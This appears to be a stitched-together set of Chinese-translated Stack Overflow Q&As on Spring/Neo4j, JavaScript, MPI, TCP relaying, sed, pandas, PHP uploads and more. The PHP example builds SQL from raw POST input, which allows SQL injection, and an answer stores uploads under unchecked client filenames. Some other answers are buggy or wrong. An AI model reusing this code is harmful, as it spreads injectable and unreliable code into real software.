    http://www.springframework.org/schema/context/spring-context.xsd
    http://www.springframework.org/schema/data/neo4j
    http://www.springframework.org/schema/data/neo4j/spring-neo4j.xsd
    http://www.springframework.org/schema/tx
    http://www.springframework.org/schema/tx/spring-tx.xsd">

<context:annotation-config/>
<context:spring-configured/>
<context:component-scan base-package="yes.ds.domain.neo4j"/>

<neo4j:config graphDatabaseService="graphDatabaseService"/>
<bean id="graphDatabaseService" class="org.neo4j.test.ImpermanentGraphDatabase" destroy-method="shutdown"/>
<!-- <neo4j:config storeDirectory="target/neo4j-db"/> -->
<neo4j:repositories base-package="yes.ds.repository.neo4j"/>
<tx:annotation-driven mode="proxy"/></beans> 
```

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2015-05-03T20:37:14.000

我想我在创建的测试实体中遇到了类似的问题。在那种特殊情况下，我忘记用`@Transactional`.

`@Transactional`的getter 和 setter 都需要注释`NodeEntities`，否则它们的行为就像您描述的那样。添加注释为我修复了它。

必须启用事务支持。

# javascript - 检查数组中是否存在具有特定属性的对象

> ID：13548705
> 
> 赞同：2
> 
> 时间：2012-11-25T05:55:03.460
> 
> 标签：javascript, list, search, object

请记住，我还没有足够的词汇来知道要搜索哪些关键字（现在只是跳上编码潮流......），所以这可能是一个非常容易回答的问题！

我有一个对象数组，比如说

```
M = [A_1, A_2, ..., A_n] 
```

，其中 A_i 是类的实例化

```
A = {text: "string", coords:[x,y]} 
```

我的问题是：检查我的数组 M 是否包含对象 A_i 的快速、优雅、简单的方法是什么？

```
A_i.text="your mom" && A_i.coords = [9,9] 
```

是真的？

我可以访问 underscore.js 似乎有一些漂亮的做事方式，但我对如何实现它有点困惑......

我尝试过的东西（使用 underscore.js 库）是：

```
var isitso = _.find(M, function (i) { 
    return i.text == "your mom" && i.coords == [9,9];
}); 
```

在学习 JS 的这个阶段，我希望有许多不同的方法来解决这个问题。只是看看可以做什么以及如何做。

提前致谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-25T06:10:36.280

你所拥有的困难在于数组相等是引用相等（它们必须是相同的内存位置），而不是值相等（它们具有相同的值）。如果您将支票更改为：

```
 return i.text == 'your mom' && i.coords[0] == 9 && i.coords[1] == 9; 
```

它应该工作。在这种情况下，您将检查第一个 (0) 和第二个 (1) 元素是否具有必要的值，而不是比较数组对象本身。比较数字确实比较值而不是参考。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-25T06:11:00.397

您无法检查数组是否相等。您需要执行以下操作：

```
_.find(M, function (i) { 
    return i.text == "your mom" && i.coords[0] == 9 && i.coords[1] == 9;
}); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-25T06:09:05.627

使用 _.filter 方法。

```
var filtered = _.filter(M, function(i) { return (i.text == "text2" && i.cords[0] == 3 && i.cords[1] == 4) }); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-25T06:11:07.263

从来没有听说过下划线js，所以我不能说它的细节。大多数 javacript 框架都有一种或另一种类型的 foreach 方法，以模拟尚未标准化的 foreach 循环。

```
function findMatches(/* target array*/ target, /* matching function*/ match) {
   var dummy = [];
   dojo.forEach(target, function(t) {
        if (match(t)) {
            dummy.push(t);
        }
   });
   return dummy;
}

var allMatches = findMatches(M, function (m) {
    m.text == "your mom" && m.coords == [9,9]
}); 
```

请注意，这`dojo.forEach`是我使用的 Dojo 库中的 forEach。jQuery 还包含你喜欢的库所没有的这种东西。

很晚了，我还没有把这段代码放在实际的浏览器中，但这个想法是合理的，即使我打错了。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-11-25T06:49:19.430

到目前为止，所有其他答案都是使用第三方 js 库。以下是对直接 js 解决方案的尝试。小提琴：http: [//jsfiddle.net/rNfph/](http://jsfiddle.net/rNfph/)

```
var M = [
    {text:'one', coord: [0,0]},
    {text:'two', coord: [1,1]},
    {text:'three', coord: [2,2]},
    {text:'four', coord: [3,3]},
    {text:'five', coord: [4,4]},
    {text:'six', coord: [5,5]},
    {text:'seven', coord: [6,6]},
    {text:'eight', coord: [7,7]},
    {text:'nine', coord: [8,8]},
    {text:'ten', coord: [9,9]}
];

var search = function(str, x, y){

    for(var i=0, len=M.length; i<len; i++){
        if( M[i].text === str && M[i].coord[0] === x && M[i].coord[1] === y ){
            return true;
        }
    }
    return false;

}

console.log( search('three', 2, 2) );
console.log( search('three', 1, 2) ); 
```

现在，把这个和一粒盐一起吃。我不是复杂性方面的专家。很可能有更好的方法来做到这一点，因为这个实现可能需要迭代所有的值。

如果对此有限制，要求 'text' 的值是唯一的，那么您可以将其全部构建为对象（字典），而不是使用数组，并在根本不需要*任何*迭代的情况下进行检查。

看到这个小提琴：http: [//jsfiddle.net/4mrsh/](http://jsfiddle.net/4mrsh/)

```
var M = {
    'one': [0,0],
    'two': [1,1],
    'three': [2,2],
    'four': [3,3]
}

var search = function(key, x, y){

    if( !M[key] || !(M[key][0] === x && M[key][1] === y) ) return false;

    return true;
}

console.log( search('three',2,2) ); //true
console.log( search('three',1,2) ); //false 
```

​</p>

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-11-25T19:12:23.530

```
if (!Array.prototype.each) {
   Array.prototype.each = function(callback) {
      var i, l = this.length;
      for (i = 0; i < l; i += 1) {
         if (callback(i, this[i]) === true) return;
      }
   }
}

function anMHasYourMom(m) {
   var found;
   m.each(function(i, el) {
      return found = (
         el.text === "your mom"
         && el.coords[0] === 9
         && el.coords[1] === 9
      );
   });
   return found;
}

var M = [A_1, A_2, ..., A_n];
if (anMHasYourMom(M)) {
   window.alert('It has one!');
} 
```

# fortran - 我应该将 MPI_INIT 放在 Fortran 模块的什么位置？

> ID：13548709
> 
> 赞同：0
> 
> 时间：2012-11-25T05:56:46.893
> 
> 标签：fortran, mpi, modulo, subroutine

我有一个问题，我不知道它是什么。我有一个带有 MPI_INIT 和 MPI_FINALIZE 的测试程序。我有一个包含 5 个子例程的模块：3 个子例程是依赖的，并且独立于其他 2 个子例程。我想把测试程序中的MPI代码放到这个模块中。我将 MPI_INIT 放在声明变量的模块中和子例程之前。我收到了一系列带有相同错误消息的错误：

```
This statement must not appear in the specification part of a module 
```

“MPI_INIT 和 MPI_FINALIZE 只应调用一次”如何影响 Fortran 程序、模块和子例程？如果有多个独立程序，每个程序都多次调用此模块的子例程，我应该将 MPI 函数和变量放在哪里？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-25T10:43:25.890

您需要在模块的子程序部分调用 MPI 子程序。

通常我定义一个 init_mpi 子程序，它调用 MPI_INIT 并最终调用 MPI_COMM_RANK 和 MPI_COMM_SIZE。您还可以在此 init_mpi 子例程中使用 MPI_INITIALIZED 以避免多次初始化。

# linux - TCP流中继

> ID：13548710
> 
> 赞同：-1
> 
> 时间：2012-11-25T05:57:08.790
> 
> 标签：linux, tcp

我有两个程序与 TCP/IP 通信。这很好用。

程序 A 打开一个 TCP 套接字。程序 B 连接到这个套接字。程序 B 向程序 A 提供数据。一切正常。

但是当我在 A 和 B 之间放置一个继电器并传递字节流时，出现了问题。

程序 C 打开两个 TCP 套接字（socket1，socket2）。程序 B 连接到这个套接字（socket1）。程序 A 连接到这个套接字（socket2）。

程序 C 使用以下代码将 TCP 流从 B 中继到 A。（这是基于linux的）

```
char buf[BUFSIZE];
while(1){
        // recv a packet segment
        if( my_recv(socket1, buf, BUFSIZE) <= 0 ){
                return 0;
        }

        if( send(socket2, buf, BUFSIZE, MSG_NOSIGNAL) != BUFSIZE ){
            return 0;
        }
} 
```

my_recv 是 recv 的包装器，以保证它会接收请求大小。

```
int my_recv(int sd, char* p, unsigned int len){
    // recv a packet segment
    unsigned int ssize=0;
    int d;
    while(ssize < len){         
        if( (d=recv( sd, p+ssize, len - ssize, 0))<=0){
            return -1;
        }
        ssize += d;         
    }
    return ssize;
} 
```

这第一次很好用。但几秒钟后，一切都搞砸了。

我已经调试了程序 A 和 B。它们没有任何问题。他们以正确的顺序发送和接收，但似乎中继提供了错误的数据......

一些建议将不胜感激。

先感谢您。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-25T06:00:07.160

您假设每次读取都会填充缓冲区。您必须使用 recv() 调用返回的计数作为 send() 调用的长度参数。

```
while ((count = recv(fd, buffer, sizeof buffer, 0)) > 0)
  send(fd, buffer, count, 0); 
```

# iphone - 更换场景时 Cocos2d 游戏崩溃（包含代码）

> ID：13548712
> 
> 赞同：0
> 
> 时间：2012-11-25T05:58:01.683
> 
> 标签：iphone, ios, cocos2d-iphone

所以我的 Cocos2d 游戏出了点问题。我最近添加了一些代码，可以让我在游戏中某些关卡的开头出现对话消息。每当我重新启动将对话框 cclayer 添加到当前场景的关卡的关卡（替换场景）时，我都会通过 iPhone 模拟器收到 BAD ACCESS 错误，然后如果我在 iPhone 4S 上运行它，我收到一个 SIGARBT 错误，上面写着

“ ***由于未捕获的异常‘NSInternalInconsistencyException’而终止应用程序，原因：‘已添加子项。无法再次添加’”

这是我制作的第一个 cocos2d 游戏。我玩弄了很多 cocos2d 并且有了我认为是基本的理解。我有很多其他语言的编程经验，但大约 3 个月前我才开始学习 Objective-c。

这是我的代码。

游戏对话.h

```
#import <Foundation/Foundation.h>
#import "cocos2d.h"
#import "GameData.h"

@interface GameDialogLayer : CCLayer {
    NSString *dialogText;
}

@property (nonatomic, retain) NSString *dialogText;

+(CCScene *) scene;
-(void) addDialogWithText: (NSString *)text;

@end 
```

游戏对话.m

```
#import "GameDialogLayer.h"

@implementation GameDialogLayer

@synthesize dialogText;

+(CCScene *) scene
{
    CCScene *scene = [CCScene node];
    GameDialogLayer *layer = [GameDialogLayer node];
    [scene addChild: layer];
    return scene;
}

-(id) init
{
    if( (self=[super init]) ) {
        // init the bg overlay
        CCLayerColor *backgroundLayer = [CCLayerColor layerWithColor:ccc4(0, 0, 0, 175)];
        [self addChild:backgroundLayer z:0];

        // init the dialog box
        CCSprite *dialogBox = [CCSprite spriteWithFile:@"dialog.png"];
        dialogBox.position = ccp([[CCDirector sharedDirector] winSize].width / 2, [[CCDirector sharedDirector] winSize].height / 2);
        [self addChild:dialogBox];

        // init the dialog menu
        CCMenuItemImage *dialogOkay = [CCMenuItemImage itemWithNormalImage:@"dialogOkayButton.png" selectedImage:@"dialogOkayButtonPressed.png" target:self selector:@selector(okayButton)];

        CCMenu *dialogMenu = [CCMenu menuWithItems:dialogOkay, nil];
        dialogMenu.position = ccp(dialogMenu.position.x, dialogMenu.position.y - 118);
        [self addChild:dialogMenu];
    }

    return self;
}

-(void) okayButton
{
    [GameData sharedGameData].isPaused = 0;
    [[self parent] schedule:@selector(startCountdown:) interval:1];
    [[self parent] removeChild:self cleanup:YES];
}

-(void) addDialogWithText: (NSString *)text
{
    CCLabelTTF *dialogTextLabel = [CCLabelTTF labelWithString:text dimensions:CGSizeMake(180, 250) hAlignment:kCCTextAlignmentLeft fontName:@"MarkerFelt-Thin" fontSize:20];
    dialogTextLabel.color = ccBLACK;
    dialogTextLabel.position = ccp([[CCDirector sharedDirector] winSize].width / 2, [[CCDirector sharedDirector] winSize].height / 2);
    [self addChild:dialogTextLabel];
}

- (void) dealloc
{
    [super dealloc];
}

@end 
```

然后对话框被添加到我的 levelData 类中的对话框属性中，该类为每个级别进行实例化并保存级别的属性。

这是持有它的财产

```
@property (nonatomic, retain) GameDialogLayer *dialog; 
```

这就是我如何将对话框添加到 levelData 对话框属性

```
-(void) addDialog: (NSString *)dialogText
{
    dialog = [GameDialogLayer node];
    [dialog addDialogWithText:dialogText];
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-26T00:53:14.197

您以某种方式将节点添加到场景中两次，我查看了您的代码并没有发现它，但它们很容易找到。只需为所有 Objective C 异常添加一个断点。调试器将停止在导致问题的行上。

请参阅[此处](https://stackoverflow.com/questions/10844725/why-does-nsassert-break-in-main-instead-of-in-the-code-that-call-the-assertion/10845508#10845508)了解如何添加断点。如果您正在使用它，您可以将“Exception: All”更改为“Exception: Objective C”以避免来自 CocosDenhesion 的异常。

# javascript - 获取文本区域元素的所有子元素？

> ID：13548715
> 
> 赞同：0
> 
> 时间：2012-11-25T05:58:49.937
> 
> 标签：javascript, jquery

我有一堆文本区域，它们是具有 id 的 div 的子项。我想在数组中的每个文本区域中获取文本 - 那么jquery中有没有办法获取某个父级的某种类型（在本例中为文本区域）的所有子级？

我试过这个 -

```
$("#optionGroup_0").children('input[type=text], textarea'); 
```

但这会返回一个空数组。我认为如果我有正确的文本区域选择器，上述方法会起作用，但我不确定。

任何人都可以帮忙吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-25T06:02:00.363

你可以这样做：

```
var array = $("#optionGroup_0 textarea").map(function() {
  return $(this).val();
}).get(); 
```

查看工作[**演示**](https://tinker.io/e424b/1)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-25T06:02:10.733

`.find()`是每一个子孙，`.children()`去的地方只有一层。请参阅：[api.jquery.com/find](http://api.jquery.com/find)

```
$("#optionGroup_0").find('input[type=text], textarea'); 
```

# bash - 使用 sed 删除文件中的所有注释

> ID：13548716
> 
> 赞同：9
> 
> 时间：2012-11-25T05:59:04.270
> 
> 标签：bash, sed

对于字符串中的“#”，您将如何使用 sed 从文件（用 # 定义）中删除所有注释？

[除了字符串部分之外，这](https://stackoverflow.com/questions/8206280/delete-all-lines-beginning-with-a-from-a-file)有很大帮助。

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-11-25T06:05:04.200

if`#`总是意味着注释，并且可以出现在一行的任何地方（比如在一些代码之后）：

```
sed 's:#.*$::g' <file-name> 
```

如果要更改它，请添加`-i`开关：

```
sed -i 's:#.*$::g' <file-name> 
```

这将从任何`#`到行尾删除，忽略任何上下文。如果您`#`在不是注释的任何地方使用（例如在字符串中），它也会删除它。

如果注释只能从行首开始，请执行以下操作：

```
sed 's:^#.*$::g' <file-name> 
```

如果它们前面可能有空格，但没有别的，请执行以下操作：

```
sed 's:^\s*#.*$::g' <file-name> 
```

这两个会更安全一些，因为它们可能不会删除`#`代码中的有效用法，例如字符串。

**编辑：**

检测字符串中是否有东西并不是一个很好的方法。如果可以满足您的语言限制，我会使用最后两个。

检测你是否在一个字符串中的问题是正则表达式不能做所有事情。有几个问题：

*   字符串可能跨越行
*   正则表达式无法区分撇号和单引号
*   正则表达式不能匹配嵌套引号（这些情况会混淆正则表达式）：

    ```
    # "hello there"
    # hello there"
    "# hello there" 
    ```

如果双引号是定义字符串的唯一方式，双引号将永远不会出现在注释中，并且字符串不能跨越多行，请尝试以下操作：

```
sed 's:#[^"]*$::g' <file-name> 
```

这是很多先决条件，但如果它们都成立，那么你就在做生意。否则，恐怕你是 SOL，你最好用 Python 之类的东西来写它，在那里你可以做更高级的逻辑。

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2012-11-25T12:48:01.577

这可能对您有用（GNU sed）：

```
sed '/#/!b;s/^/\n/;ta;:a;s/\n$//;t;s/\n\(\("[^"]*"\)\|\('\''[^'\'']*'\''\)\)/\1\n/;ta;s/\n\([^#]\)/\1\n/;ta;s/\n.*//' file 
```

*   `/#/!b`如果该行不包含`#`救助
*   `s/^/\n/`插入唯一标记 ( `\n`)
*   `ta;:a`跳转到循环标签（重置替代真/假标志）
*   `s/\n$//;t`如果标记在行尾，删除并退出
*   `s/\n\(\("[^"]*"\)\|\('\''[^'\'']*'\''\)\)/\1\n/;ta`如果标记后面的字符串是带引号的字符串，则将标记向前碰撞并循环。
*   `s/\n\([^#]\)/\1\n/;ta`如果标记后面的字符不是 a `#`，则将标记向前碰撞并循环。
*   `s/\n.*//`该行的其余部分是注释，删除标记和行的其余部分。

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2012-11-25T08:12:03.397

由于提问者没有提供示例输入，因此我将假设几种情况，并且 Bash 是输入文件，因为 bash 被用作问题的标签。

**案例1**：整行是注释

在大多数情况下，以下内容应该足够了：

```
sed '/^\s*#/d' file 
```

它匹配任何没有或至少有一个前导空白字符（空格、制表符或其他几个字符，请参阅`man isspace`）的行，后跟 a ，然后通过命令`#`删除该行。`d`

任何行，如：

```
# comment started from beginning.
         # any number of white-space character before
    # or 'quote' in "here" 
```

它们将被删除。

但

```
a="foobar in #comment" 
```

不会被删除，这是想要的结果。

**案例2**：实际代码后注释

例如：

```
if [[ $foo == "#bar" ]]; then # comment here 
```

评论部分可以通过

```
sed "s/\s*#*[^\"']*$//" file 
```

`[^\"']`用于防止带引号的字符串混淆，但是，它也意味着带引号的注释`'`或`"`不会被删除。

**最后的 sed**

```
sed "/^\s*#/d;s/\s*#[^\"']*$//" file 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2015-02-19T19:00:05.810

要删除注释行（第一个非空白字符为 的行`#`）但*不*删除shebang 行（第一个字符为 的行`#!`）：

```
sed '/^[[:space:]]*#[^!]/d; /#$/d' file 
```

to 的第一个参数`sed`是一个字符串，其中包含一个 sed 程序，该程序由两个`/`*regex*`/d`形式的删除行命令组成。命令以 . 分隔`;`。第一个命令删除注释行但不删除 shebang 行。第二个命令删除任何剩余的空注释行。它不处理尾随注释。

的最后一个参数`sed`是用作输入的文件。在 Bash 中，您还可以像这样对字符串变量进行操作：

```
sed '/^[[:space:]]*#[^!]/d; /#$/d' <<< "${MYSTRING}" 
```

例子：

```
# test.sh
S0=$(cat << HERE
#!/usr/bin/env bash
# comment
  # indented comment
echo 'FOO' # trailing comment
# last line is an empty, indented comment
  #
HERE
)
printf "\nBEFORE removal:\n\n${S0}\n\n"
S1=$(sed '/^[[:space:]]*#[^!]/d; /#$/d' <<< "${S0}")
printf "\nAFTER removal:\n\n${S1}\n\n" 
```

输出：

```
$ bash test.sh

BEFORE removal:

#!/usr/bin/env bash
# comment
  # indented comment
echo 'FOO' # trailing comment
# last line is an empty, indented comment
  #    

AFTER removal:

#!/usr/bin/env bash
echo 'FOO' # trailing comment 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-11-25T18:40:38.913

假设“在一个字符串中”意味着“出现在一对引号之间，无论是单引号还是双引号”，这个问题可以改写为“删除第一个未引用的 # 之后的所有内容”。反过来，您可以将带引号的字符串定义为两个引号之间的任何内容，反斜杠引号除外。作为一个小的改进，将整行替换为第一个未引用的 # 之前的所有内容。

所以我们得到了类似`[^\"'#]`普通情况的东西——一段既不是注释符号，也不是反斜杠，也不是开头引号的字符串。然后我们可以接受一个反斜杠后跟任何内容：`\\.`-- 这不是文字点，而是文字反斜杠，后跟一个匹配任何字符的点元字符。

然后我们可以允许引用字符串的零次或多次重复。为了接受单引号或双引号，每个引号允许零个或多个。带引号的字符串应定义为开引号，后跟零个或多个反斜杠任意字符或除右引号之外的任何字符：`"\(\\.\|[^\"]\)*"`或类似的单引号字符串`'\(\\.\|[^\']\)*'`。

将所有这些拼凑在一起，您的`sed`脚本可能如下所示：

```
s/^\([^\"'#]*\|\\.\|"\(\\.\|[^\"]\)*"\|'\(\\.\|[^\']\)*'\)*\)#.*/\1/ 
```

但是因为它需要被引用，并且单引号和双引号都包含在字符串中，所以我们需要额外的复杂性。回想一下，shell 允许您将字符串粘合在一起，例如用双引号和单引号`"foo"'bar'`替换为`foobar`-- 。因此，您可以通过将单引号放在与单引号字符串相邻的双引号中来包含单引号 - 在双引号旁边的单引号中，因此; 并且可以表示为与 相邻。因此，包含两个双引号的单引号字符串可以用相邻引用，或者，对于这种情况，可能更现实地是相邻`foo``bar``'"foo"'"'"``"foo"``'``"foo"'``"'``'"'``"'"``foo"'bar``'foo"'``"'bar"``'foo"'``"'"`与另一个单引号字符串相邻`'bar'`，产生`'foo'"'"'bar'`.

```
sed 's/^\(\(\\.\|[^\#"'"'"']*\|"\(\\.\|[^\"]\)*"\|'"'"'\(\\.\|[^\'"'"']\)*'"'"'\)*\)#.*/\1/p' file 
```

这是在 Linux 上测试的；在其他平台上，`sed`方言可能略有不同。例如，您可能需要在分组和更改运算符之前省略反斜杠。

唉，如果你可能有多行引用的字符串，这将不起作用；`sed`，按照设计，一次只检查一个输入行。您可以构建一个复杂的脚本，将多行收集到内存中，但是到那时，切换到例如 Perl 开始变得很有意义。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2018-03-11T19:22:58.397

正如您所指出的，如果脚本的任何部分看起来像注释但实际上不是，则 sed 将无法正常工作。例如，您可以在字符串中找到 # 或相当常见的`$#`and `${#param}`。

我编写了一个名为[shfmt](https://github.com/mvdan/sh)的 shell 格式化程序，它具有缩小代码的功能。这包括删除评论，除其他外：

```
$ cat foo.sh
echo $# # inline comment
# lone comment
echo '# this is not a comment'
[mvdan@carbon:12] [0] [/home/mvdan]
$ shfmt -mn foo.sh
echo $#
echo '# this is not a comment' 
```

解析器和打印机是 Go 包，所以如果您想要一个自定义解决方案，编写一个 20 行的 Go 程序以您想要的确切方式删除注释应该相当容易。

* * *

## 回答 #7

> 赞同：-1
> 
> 时间：2014-07-28T07:52:04.167

```
sed 's:^#\(.*\)$:\1:g' filename 
```

假设这些行以单个 # 注释开头，上述命令将从文件中删除所有注释。

# activeadmin - ActiveAdmin - 重用显示表单的自定义操作

> ID：13548717
> 
> 赞同：0
> 
> 时间：2012-11-25T05:59:06.037
> 
> 标签：activeadmin

我正在创建一个自定义操作，用作 ActiveAdmin 的显示视图，是否有任何我可以在部分上重用的助手，以便我可以重用 ActiveAdmin 显示视图模板。

我认为显示操作，您可以使用 attributes_tables 自定义排列，是否有类似的东西可以重用于视图？

```
show do |ad|
  attributes_table do
    row :title
  end
end 
```

这是我的自定义操作：

```
member_action :read do
    @app = App.find(params[:id])
    #Rendering Partial
end 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-26T17:21:06.113

您可以在两个视图中使用局部视图，但需要一点技巧：

`app/admin/apps.rb`

```
ActiveAdmin.register App do
  show do
    @app = App.find(params[:id])
    render "show", context: self
  end

  member_action :read do
    @app = App.find(params[:id])
  end 
end 
```

`app/views/admin/apps/_show.builder`

```
context.instance_eval do
  div do
    panel "Address" do
      attributes_table_for @address do
        row :address_line_1
      end
    end
    active_admin_comments_for @address
  end
end 
```

`app/views/admin/apps/read.builder`

```
render "show", context: self 
```

**编辑：**让它工作！

**编辑 2：**使评论工作！

# c++ - 代码片段在某些情况下有效，但不如预期，为什么？

> ID：13548720
> 
> 赞同：0
> 
> 时间：2012-11-25T05:59:25.360
> 
> 标签：c++, parsing, object, loops, cin

我有这个代码片段应该测试用户是否输入整数。如果用户输入字母而不是小数，这将起作用，我想知道为什么会这样。这是我的代码片段：

```
Student student;
int id;

while(!(cin >> id))
{
    cout << "\nERROR: Please enter a Positive Whole Number" << endl;
    cin.clear();
    cin.ignore ();
    cout << "Enter Student ID: ";
} 
```

输入`A`将使其遍历while循环，但如果我输入`12.5`它会退出while循环并继续运行。不是在测试它是否会解析为整数吗？为什么它接受`12.5`但不接受字符？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-25T06:05:26.823

`cin>>id`只要找到可以转换为（在本例中为“12”）的*东西，它就会成功。*`int`当它到达它无法转换的东西时，它会停止，但如果它`int`已经被读取，那算作成功。

要检查它读取的*所有内容*是否都是数字，您可能需要执行类似 using`std::getline`将一行输入读入字符串，然后用于`std::isdigit`测试这些是否都是数字的操作。测试转换为`int`（本身）只会告诉您它找到了可以读取为整数的东西，但不会告诉您后面是否有其他无法转换为`int`.

# python - pandas DataFrame 自己划分一列

> ID：13548721
> 
> 赞同：3
> 
> 时间：2012-11-25T05:59:26.197
> 
> 标签：python, dataframe, pandas

我有一个熊猫数据框，我用这个填充了：

```
import pandas.io.data as web
test = web.get_data_yahoo('QQQ') 
```

数据框在 iPython 中如下所示：

```
In [13]:  test
Out[13]:
    <class 'pandas.core.frame.DataFrame'>
    DatetimeIndex: 729 entries, 2010-01-04 00:00:00 to 2012-11-23 00:00:00
    Data columns:
    Open         729  non-null values
    High         729  non-null values
    Low          729  non-null values
    Close        729  non-null values
    Volume       729  non-null values
    Adj Close    729  non-null values
    dtypes: float64(5), int64(1) 
```

当我将一列除以另一列时，我得到一个具有令人满意的小数位数的 float64 结果。例如，我什至可以将一列除以另一列偏移一，`test.Open[1:]/test.Close[:]`并获得令人满意的小数位数。但是，当我将一列除以自身偏移量时，我只得到 1：

```
In [83]: test.Open[1:] / test.Close[:]
Out[83]:

    Date
    2010-01-04         NaN
    2010-01-05    0.999354
    2010-01-06    1.005635
    2010-01-07    1.000866
    2010-01-08    0.989689
    2010-01-11    1.005393
...
In [84]: test.Open[1:] / test.Open[:]
Out[84]:
    Date
    2010-01-04   NaN
    2010-01-05     1
    2010-01-06     1
    2010-01-07     1
    2010-01-08     1
    2010-01-11     1 
```

我可能错过了一些简单的东西。为了从这种计算中获得有用的价值，我需要做什么？提前感谢您的帮助。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-25T15:07:04.357

如果您希望在列和滞后值之间进行操作，您应该执行类似`test.Open / test.Open.shift()`. `shift`重新对齐数据并采用可选数量的周期。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-25T06:36:53.713

当你这样做时，你可能不会得到你认为的那样`test.Open[1:]/test.Close`。Pandas 根据索引匹配行，因此您仍然将一列的每个元素除以另一列中的相应元素（而不是前一行的元素）。这是一个例子：

```
>>> print d
   A  B   C
0  1  3   7
1 -2  1   6
2  8  6   9
3  1 -5  11
4 -4 -2   0
>>> d.A / d.B
0    0.333333
1   -2.000000
2    1.333333
3   -0.200000
4    2.000000
>>> d.A[1:] / d.B
0         NaN
1   -2.000000
2    1.333333
3   -0.200000
4    2.000000 
```

请注意，两个操作的返回值是相同的。第二个只有`nan`第一个，因为第一个操作数中没有对应的值。

如果您真的想对偏移行进行操作，则需要深入挖掘支持 pandas DataFrame 的 numpy 数组，以绕过 pandas 的索引对齐功能。您可以通过`values`列的属性来了解这些内脏。

```
>>> d.A.values[1:] / d.B.values[:-1]
array([-0.66666667,  8\.        ,  0.16666667,  0.8       ]) 
```

现在，您确实在另一列中将每个值除以它之前的值。请注意，在这里您必须显式切分第二个操作数以省略最后一个元素，以使它们的长度相等。

所以你可以用它自己的偏移版本来划分一列：

```
>>> d.A.values[1:] / d.A.values[:-1]
45: array([-2\.   , -4\.   ,  0.125, -4\.   ]) 
```

# php - 如何将图像上传到 PHP Web 服务器？

> ID：13548722
> 
> 赞同：-1
> 
> 时间：2012-11-25T05:59:29.823
> 
> 标签：php, mysql

以下代码将数据上传到 MySQL，但我想添加一个浏览按钮以在 MySQL 中上传图像。

我怎样才能做到这一点？

```
<form action='submiturl.php' method='POST'>
           <font face='sans-serif' size='5'>
           <center>
                   <span class="style2">Please fill out all fields to submit your Keyword.</span><br>
                   <br>
                   <span class="style2">Word Name:</span><br>
            <input type='text' size='50' name='title'><br><br> 
            <span class="style2">Keywords:</span><br><input type='text' size='50' name='keywords'><br>
            <span class="style2"><br>
Description</span><br><input name='description' type='text' value="" size='50' maxlength='200'>
<br><br>
             <input type='submit' name='submit' value='Submit URL'>
</form>
<br><a href='index.php' class="style2">Go Back</a></HTML>

<?php
// Language file in UTF-8
$submit = $_POST['submit'];
$title = $_POST['title'];
$keywords = $_POST['keywords'];
$description = $_POST['description'];

$connect = mysql_connect("localhost","123_search","password");
mysql_select_db("123_search");

if (!$title||!$keywords||!$description)
{
  die ("<center>Please fill in all fields.</center>");
}
else
if ($submit)
{
mysql_query("INSERT INTO searchengine VALUES('','$title','$keywords','$description')");
echo "<center>KeyWord Submitted!</center>";
}
else
echo "<center>Please fill in all fields.</center>";
?> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-25T06:07:00.477

使用`<input type='file' name='uploadimage'>`. 它将创建带有浏览按钮的文本框。

要了解有关如何在 MySQL 中存储图像的更多信息，您可以访问[此](http://forum.codecall.net/topic/40286-tutorial-storing-images-in-mysql-with-php/#axzz2DDFKerHp)链接

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-11-25T06:06:07.127

浏览按钮在 MySQL 中上传图片？

如果您的意思是将图像文件上传到远程目录（例如，'images/'）但同时将文件名保存在表中（mysql），那么您可以阅读很多教程。

[这](http://php.about.com/od/phpwithmysql/ss/Upload_file_sql.htm)是链接。

上传图像并将文件名保存到数据库的简单教程。

## 编辑

将此添加到您的表单中

```
<form action='submiturl.php' method='POST' enctype="multipart/form-data"> 
```

在表单中添加文件按钮

```
<input type="file" name="photo"><br> 
```

将上传的文件保存在目录中

```
 $target = "images/"; //This is the directory where images will be saved 
 $target = $target . basename( $_FILES['photo']['name']); 
```

您可以通过以下方式获取已发布的文件信息以及 php 中的所有其他已发布数据：

```
$pic=($_FILES['photo']['name']); // this gets the filename of the upload pic 
```

现在您可以将其保存到您的数据库表中。在您的数据库表中为文件名创建一个字段，然后像您在问题中所做的那样插入文件名和其余部分。

# django - Django 使用另一个模板引擎（变色龙）

> ID：13548726
> 
> 赞同：0
> 
> 时间：2012-11-25T06:00:58.187
> 
> 标签：django, template-engine

我想知道我是否可以在 django 项目上使用除 django 之外的另一个模板引擎，确切地说，它是[chameleon](http://chameleon.repoze.org/)，并且有任何性能问题吗？只是好奇，因为我更熟悉`chameleon`

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-25T06:47:39.070

在 Django 中更容易替换的部分是模板引擎，它并不以惊人的性能而闻名。

我对混合[Django 和 Jinja2](http://matthowell.com/blog/2011/03/02/integrating-jinja2-and-django/)的结果很满意，不幸的是我无法评论 chamaleon。

# php - 将 MSSQL blob 数据存储到 MySQL blob 数据

> ID：13548729
> 
> 赞同：0
> 
> 时间：2012-11-25T06:01:31.480
> 
> 标签：php, mysql, sql-server, database, blob

